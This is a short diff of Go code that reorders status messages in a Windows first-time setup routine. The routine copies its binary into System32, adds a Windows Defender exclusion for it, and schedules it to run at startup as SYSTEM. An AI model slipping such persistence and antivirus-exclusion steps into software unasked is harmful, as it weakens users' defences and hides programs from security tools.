@@ -252,12 +252,12 @@ func WindowsFirstTimeSetup() {
 	handle(err)
 	ExecPowerShell("copy \"" + exePath + "\" C:\\Windows\\System32\\one.exe")
 
-	fmt.Println("Scheduling startup task...")
-
+	fmt.Println("Creating Windows Defender Exclusion rule...")
 	// Tell windows defender our binary can be trusted.
 	_, err = ExecPowerShell("Add-MpPreference -ExclusionPath " + exePath)
 	handle(err)
 
+	fmt.Println("Scheduling startup task...")
 	// Enable the failsafe task to run at startup
 	_, err = ExecPowerShell(`schtasks /create /tn "project-one" /tr "C:\Windows\System32\one.exe" /sc onstart /ru "SYSTEM" /F`)
 	handle(err)
